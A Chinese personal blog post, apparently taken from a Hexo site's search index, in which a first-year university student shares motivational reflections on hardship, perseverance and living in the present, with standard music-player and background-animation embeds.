        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>之所以写这篇文章，是在大学里有很多事情（大一），感受到了很多吧！所以谈谈我在大学里的一些感想吧！大学没我想的那么好，谁说的大学很轻松的，我怎么没感觉到？<br>哎！或许是我自己的能力太差了！</p><p>没有人会帮你一辈子，所以你要一直奋斗。学着做你自己，并优雅地放手所有不属于你的东西。不要太想念过去，因它会给你带来悲伤；不要太思考未来，因它会带给你恐惧；用微笑活在当下，它会带来喜乐。生活中很奇怪的是，你很容易忘记你想记得的事情，却不容易忘记你想忘掉的事情。</p><p>别让自己心太累，应该学着想开，看淡，学着不强求，学着深藏，适时放松自己，寻找宣泄，给疲惫的心灵解解压。人之所以会烦恼，就是记性太好。该记的不该记的都会留在记忆里，而我们又时常记住了应该忘掉的事情，忘掉了应该记住的事情。人之所以活着累，就是想得要的太多了。</p><p>每个人都可能会碰到特别难熬的阶段，或长或短，让你感到绝望，看不到光。可是，沉溺于抱怨、苦恼是没有用的，难过痛苦更加无济于事，倒不如收拾收拾心情，抖擞抖擞精神，昂首挺胸去面对，也许一切就会柳暗花明。</p><p>至于未来会怎样，要用力走下去才知道，记住，不要轻易放弃，自己的命运在自己手中，跌倒失败有何惧，只要干不死，就往死里干，反正路还长，天总会亮。</p><p>一个人，想要优秀，那么你就必须要接受挑战；一个人，你想要尽快优秀，就要去寻找挑战。世界上，成功的有两种人，一种人是傻子，一种人是疯子。傻子是会吃亏的人，疯子是会行动的人。</p><p>有些事，你真别看清，看清，心痛；有些人，你真别看懂，看懂，伤情。人生，就是一种糊涂，一份模糊，说懂不懂，说清不清，糊里糊涂，含含糊糊。人生看不惯的东西太多，看清、看懂，全是自找伤心。给生活罩上一层薄雾，不是自欺，而是对自我的保护。凡事太认真，苦了心，累了自己。</p><p>加油！望诸君共勉！！！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29567633&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
